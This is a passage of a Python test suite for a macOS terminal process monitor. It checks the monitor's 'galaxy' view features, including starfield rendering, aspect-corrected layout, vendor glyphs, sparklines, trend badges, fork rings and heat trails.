        assert node_pids == {1, 2}, \
            "parent of an interesting PID should be retained"

    # ── Feature 1: Starfield background ──────────────────────────────

    def _capture_fullscreen(self, monitor, w=120, h=40):
        """Render the fullscreen galaxy and return a list of
        (y, x, text, attr) tuples for every painted run."""
        from unittest.mock import patch
        captured = []

        def fake_put(y, x, text, attr=0):
            captured.append((y, x, text, attr))

        with patch("curses.color_pair", side_effect=lambda n: n << 8), \
             patch.object(monitor, "_put", side_effect=fake_put):
            monitor._galaxy_render_fullscreen(w, h)
        return captured

    def test_starfield_paints_dot_glyphs(self, monitor):
        monitor._total_mem_kb = 16 * 1024 * 1024
        monitor._galaxy_mode = True
        # Few small bubbles so most of the canvas is empty.
        monitor.rows = [
            {"pid": 1, "ppid": 0, "command": "/usr/bin/x",
             "cpu": 0.1, "agg_cpu": 0.1,
             "rss_kb": 100, "agg_rss_kb": 100},
        ]
        runs = self._capture_fullscreen(monitor)
        joined = "\n".join(t for _, _, t, _ in runs)
        # Stars should appear somewhere on the canvas.
        assert "·" in joined or "⋅" in joined, \
            "expected starfield glyphs in the fullscreen render"

    def test_starfield_not_visible_inside_bubble(self, monitor):
        """A single heavy bubble: the cells inside its bounding box
        must show bubble glyphs / inverse fill, NOT starfield dots."""
        monitor._total_mem_kb = 16 * 1024 * 1024
        monitor._galaxy_mode = True
        monitor.rows = [
            {"pid": 1, "ppid": 0,
             "command": "/Applications/Google Chrome.app/Contents/MacOS/"
                        "Google Chrome",
             "cpu": 80.0, "agg_cpu": 80.0,
             "rss_kb": 2 * 1024 * 1024, "agg_rss_kb": 2 * 1024 * 1024},
        ]
        runs = self._capture_fullscreen(monitor)

        # Build a y -> {x: ch} map from every painted run.
        screen = {}
        for y, x, text, _ in runs:
            for i, ch in enumerate(text):
                screen.setdefault(y, {})[x + i] = ch

        # Find the bubble centre (the position is a float; centre cell
        # is the one with the box-drawing border).
        cx, cy = monitor._galaxy_positions[1]
        bw, bh = monitor._galaxy_bubble_size(monitor.rows[0])
        x0 = int(cx) - bw // 2
        y0 = int(cy) - bh // 2
        # Header occupies row 0 — body starts at row 1.
        body_y0 = y0 + 1
        for dy in range(1, bh - 1):  # inner rows only
            for dx in range(1, bw - 1):
                ch = screen.get(body_y0 + dy, {}).get(x0 + dx)
                # Inside a bubble we should NEVER see starfield dots.
                assert ch != "·" and ch != "⋅", \
                    f"starfield glyph leaked into bubble at ({dy},{dx})"

    # ── Feature 2: Vertical aspect correction ───────────────────────

    def test_layout_spreads_vertically_not_just_horizontally(self, monitor):
        """Aspect-corrected solver: with the y-separation scaled to
        compensate for ~2:1 terminal cells, the cluster spreads
        vertically as well as horizontally.

        Compare two solvers on a wide canvas: one with the aspect
        correction in place (the live impl) and the same setup ran
        again with a tighter cluster to verify that y spread is a
        meaningful fraction of x spread (i.e. not a horizontal line).
        """
        import random as _r
        import statistics
        _r.seed(101)
        monitor._total_mem_kb = 16 * 1024 * 1024
        # Small load so bubbles are 13x4 (smallest tier with a cpu line);
        # canvas is wide enough that the solver has room to choose.
        monitor.rows = [
            {"pid": i + 1, "ppid": 0, "agg_cpu": 5.0, "cpu": 5.0,
             "agg_rss_kb": 100, "rss_kb": 100,
             "command": f"/Applications/App{i}.app/Contents/MacOS/App{i}"}
            for i in range(8)
        ]
        for _ in range(20):
            monitor._galaxy_step(160, 50)
        xs = [monitor._galaxy_positions[r["pid"]][0] for r in monitor.rows]
        ys = [monitor._galaxy_positions[r["pid"]][1] for r in monitor.rows]
        sx = statistics.pstdev(xs)
        sy = statistics.pstdev(ys)
        assert sx > 0
        # With aspect correction the y spread should be a meaningful
        # fraction of the x spread (cells are ~2:1, so a *visually*
        # round cluster has stdev_y ≈ 0.5 * stdev_x in cells).
        assert sy >= 0.4 * sx, (
            f"layout looks horizontally smeared: stdev_y={sy:.2f}, "
            f"stdev_x={sx:.2f}")

    # ── Feature 3: Vendor logo glyphs ───────────────────────────────

    def test_vendor_glyph_in_chrome_bubble(self, monitor):
        monitor._total_mem_kb = 16 * 1024 * 1024
        row = {"pid": 100, "command":
               "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
               "agg_cpu": 12.0, "agg_rss_kb": 300 * 1024}
        bw, bh = monitor._galaxy_bubble_size(row)
        lines = monitor._galaxy_render_bubble(row, bw, bh)
        body = "\n".join(lines[1:-1])
        assert procmon.ProcMonUI._GALAXY_VENDOR_GLYPHS["google"] in body

    def test_vendor_glyph_in_slack_bubble(self, monitor):
        monitor._total_mem_kb = 16 * 1024 * 1024
        row = {"pid": 101, "command":
               "/Applications/Slack.app/Contents/MacOS/Slack",
               "agg_cpu": 12.0, "agg_rss_kb": 300 * 1024}
        bw, bh = monitor._galaxy_bubble_size(row)
        lines = monitor._galaxy_render_bubble(row, bw, bh)
        body = "\n".join(lines[1:-1])
        assert procmon.ProcMonUI._GALAXY_VENDOR_GLYPHS["slack"] in body

    def test_vendor_glyph_unknown_falls_back(self, monitor):
        monitor._total_mem_kb = 16 * 1024 * 1024
        row = {"pid": 102, "command": "/Users/alice/random-binary",
               "agg_cpu": 12.0, "agg_rss_kb": 300 * 1024}
        bw, bh = monitor._galaxy_bubble_size(row)
        lines = monitor._galaxy_render_bubble(row, bw, bh)
        body = "\n".join(lines[1:-1])
        assert procmon.ProcMonUI._GALAXY_VENDOR_GLYPHS["unknown"] in body

    # ── Feature 4: Mini-sparklines inside heavy bubbles ─────────────

    def test_sparkline_in_tier3_bubble(self, monitor):
        import collections as _c
        monitor._total_mem_kb = 16 * 1024 * 1024
        # tier-3 bubble (size 13×4)
        row = {"pid": 555, "command": "/Applications/Slack.app/Contents/"
               "MacOS/Slack", "agg_cpu": 8.0, "agg_rss_kb": 100 * 1024}
        # Populate 30 CPU samples — varied so the sparkline renders blocks.
        dq = _c.deque(maxlen=60)
        for i in range(30):
            dq.append(float(i % 8))
        monitor._metric_history[555] = {"cpu": dq}
        bw, bh = monitor._galaxy_bubble_size(row)
        assert (bw, bh) == (13, 4)
        lines = monitor._galaxy_render_bubble(row, bw, bh)
        bottom_inner = lines[-2]  # bh-2 inner; -2 from outer = last inner
        # Bottom inner row contains at least one block-glyph.
        assert any(c in bottom_inner for c in "▁▂▃▄▅▆▇█"), \
            f"expected sparkline blocks on bottom inner row: {bottom_inner!r}"

    def test_sparkline_blank_for_new_pid(self, monitor):
        monitor._total_mem_kb = 16 * 1024 * 1024
        row = {"pid": 999, "command": "/Applications/Slack.app/Contents/"
               "MacOS/Slack", "agg_cpu": 8.0, "agg_rss_kb": 100 * 1024}
        # No history at all for this pid.
        bw, bh = monitor._galaxy_bubble_size(row)
        # Must not raise.
        lines = monitor._galaxy_render_bubble(row, bw, bh)
        assert len(lines) == bh
        # Bottom inner row contains no block-glyphs (no samples yet).
        bottom_inner = lines[-2]
        assert not any(c in bottom_inner for c in "▁▂▃▄▅▆▇█")

    def test_sparkline_only_for_tier3_or_higher(self, monitor):
        import collections as _c
        monitor._total_mem_kb = 16 * 1024 * 1024
        # tier-1 bubble: 11x3, no sparkline expected.
        row = {"pid": 777, "command": "/Applications/Slack.app/Contents/"
               "MacOS/Slack", "agg_cpu": 1.0, "agg_rss_kb": 50 * 1024}
        dq = _c.deque(maxlen=60)
        for i in range(30):
            dq.append(float(i % 8))
        monitor._metric_history[777] = {"cpu": dq}
        bw, bh = monitor._galaxy_bubble_size(row)
        assert bw == 11
        lines = monitor._galaxy_render_bubble(row, bw, bh)
        joined = "\n".join(lines[1:-1])
        assert not any(c in joined for c in "▁▂▃▄▅▆▇█"), \
            "tier-1 bubbles must not render sparklines"

    # ── Feature 5: Trend badges ──────────────────────────────────────

    def test_trend_badge_rising(self):
        """Rising series → ↑ glyph, green pair."""
        glyph, pair = procmon.ProcMonUI._galaxy_trend_badge(
            [1.0, 2.0, 3.0, 30.0, 40.0])
        assert glyph == "↑"
        assert pair == 1  # green

    def test_trend_badge_falling(self):
        glyph, pair = procmon.ProcMonUI._galaxy_trend_badge(
            [40.0, 35.0, 30.0, 5.0, 1.0])
        assert glyph == "↓"
        assert pair == 5  # red

    def test_trend_badge_flat(self):
        glyph, pair = procmon.ProcMonUI._galaxy_trend_badge(
            [10.0, 10.0, 10.0, 10.0, 10.0])
        assert glyph == "→"
        assert pair == 10  # light grey

    def test_trend_badge_too_few_samples(self):
        glyph, pair = procmon.ProcMonUI._galaxy_trend_badge([1.0, 2.0, 3.0])
        assert glyph is None

    def test_trend_badge_painted_top_right(self, monitor):
        """Render fullscreen and assert that one of the trend glyphs
        is painted somewhere on the canvas for a row with rising
        history."""
        import collections as _c
        from unittest.mock import patch
        monitor._total_mem_kb = 16 * 1024 * 1024
        monitor._galaxy_mode = True
        monitor.rows = [
            {"pid": 1, "ppid": 0, "command": "/Applications/Slack.app/"
             "Contents/MacOS/Slack", "cpu": 50.0, "agg_cpu": 50.0,
             "rss_kb": 2 * 1024 * 1024,
             "agg_rss_kb": 2 * 1024 * 1024},
        ]
        # Rising CPU history → expect ↑.
        dq = _c.deque(maxlen=60)
        for v in [1.0, 2.0, 3.0, 40.0, 50.0]:
            dq.append(v)
        monitor._metric_history[1] = {"cpu": dq}

        captured = []
        def fake_put(y, x, text, attr=0):
            captured.append((y, x, text, attr))
        with patch("curses.color_pair", side_effect=lambda n: n << 8), \
             patch.object(monitor, "_put", side_effect=fake_put):
            monitor._galaxy_render_fullscreen(120, 40)

        joined = "".join(t for _, _, t, _ in captured)
        assert "↑" in joined, "expected up-trend badge for rising CPU"

    # ── Feature 6: Fork ring pulse ──────────────────────────────────

    def test_fork_ring_populated_for_new_pid(self, monitor):
        monitor.rows = self._make_rows(3)
        monitor._galaxy_step(60, 20)
        for r in monitor.rows:
            assert r["pid"] in monitor._galaxy_fork_rings

    def test_fork_ring_advances_each_tick(self, monitor):
        monitor.rows = self._make_rows(2)
        monitor._galaxy_step(60, 20)
        first = dict(monitor._galaxy_fork_rings)
        monitor._galaxy_step(60, 20)
        for pid, start in first.items():
            assert monitor._galaxy_fork_rings.get(pid, -1) > start

    def test_fork_ring_pops_after_six_ticks(self, monitor):
        monitor.rows = self._make_rows(2)
        monitor._galaxy_step(60, 20)
        # Need to keep the same pids alive for 6 more ticks.
        for _ in range(6):
            monitor._galaxy_step(60, 20)
        assert monitor._galaxy_fork_rings == {}

    def test_fork_ring_dropped_when_pid_disappears(self, monitor):
        monitor.rows = self._make_rows(3)
        monitor._galaxy_step(60, 20)
        # Drop pid 2 entirely.
        monitor.rows = [r for r in monitor.rows if r["pid"] != 2]
        monitor._galaxy_step(60, 20)
        assert 2 not in monitor._galaxy_fork_rings

    # ── Feature 7: Heat trails ──────────────────────────────────────

    def test_trail_captured_after_tick(self, monitor):
        monitor.rows = self._make_rows(3)
        monitor._galaxy_step(60, 20)  # populates positions
        # Second tick should record a trail snapshot (the pre-tick state).
        monitor._galaxy_step(60, 20)
        assert len(monitor._galaxy_trails) >= 1
        # Each snapshot maps pid → (x, y) tuples.
        snap = monitor._galaxy_trails[-1]
        for pid, pos in snap.items():
            assert isinstance(pos, tuple) and len(pos) == 2

    def test_trail_deque_cap(self, monitor):
        monitor.rows = self._make_rows(2)
        for _ in range(10):
            monitor._galaxy_step(60, 20)
        # Maxlen=3 keeps the deque bounded.
        assert len(monitor._galaxy_trails) <= 3

    def test_aspect_correction_uses_doubled_min_dy(self):
        """Static check: the overlap solver's required vertical
        separation is doubled to compensate for ~2:1 terminal cells."""
        import pathlib
        impl_path = pathlib.Path(procmon.__file__).parent / \
            "mac_tui_procmon_impl.py"
        src = impl_path.read_text(encoding="utf-8")
        # The min_dy line must include the *2 aspect factor inside
        # _galaxy_step's overlap-resolution block.
        assert "min_dy = ((ph + qh) / 2.0 + 1.0) * 2.0" in src, \
            "min_dy in _galaxy_step must be scaled x2 for aspect correction"

    def test_starfield_deterministic(self, monitor):
        """Same canvas size renders the same star pattern (no shimmer)."""
        monitor._total_mem_kb = 16 * 1024 * 1024
        monitor._galaxy_mode = True
        monitor.rows = []
        # Two renders back-to-back must produce identical star layouts.
        runs1 = self._capture_fullscreen(monitor)
        runs2 = self._capture_fullscreen(monitor)
        # Extract positions of star glyphs from each render.
        def stars(runs):
            out = set()
            for y, x, text, _ in runs:
                for i, ch in enumerate(text):
                    if ch in ("·", "⋅"):
                        out.add((y, x + i, ch))
            return out
        assert stars(runs1) == stars(runs2)
